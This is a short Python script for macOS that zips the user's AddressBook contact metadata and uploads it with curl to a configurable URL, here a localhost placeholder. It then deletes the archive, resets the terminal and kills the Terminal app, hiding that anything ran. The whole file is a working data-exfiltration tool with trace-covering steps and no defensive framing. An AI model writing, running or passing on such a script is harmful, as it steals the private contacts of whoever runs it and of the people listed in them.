#!/usr/bin/env python
import os
import shutil
import getpass
from os.path import expanduser
import subprocess
from time import sleep

home = expanduser("~")

clocation = home + "/Library/Application Support/AddressBook/Metadata/"

uploadlink = "http://localhost/"

user = getpass.getuser()

zipname = "./{0}".format(user)

shutil.make_archive(zipname, 'zip', clocation)

subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
# This is not a good way to handle this but works for now
sleep(0.5)
subprocess.Popen(['rm', '-r', '{0}.zip'.format(zipname)])

subprocess.call(['tput', 'reset'])
subprocess.call(['killall', 'Terminal'])
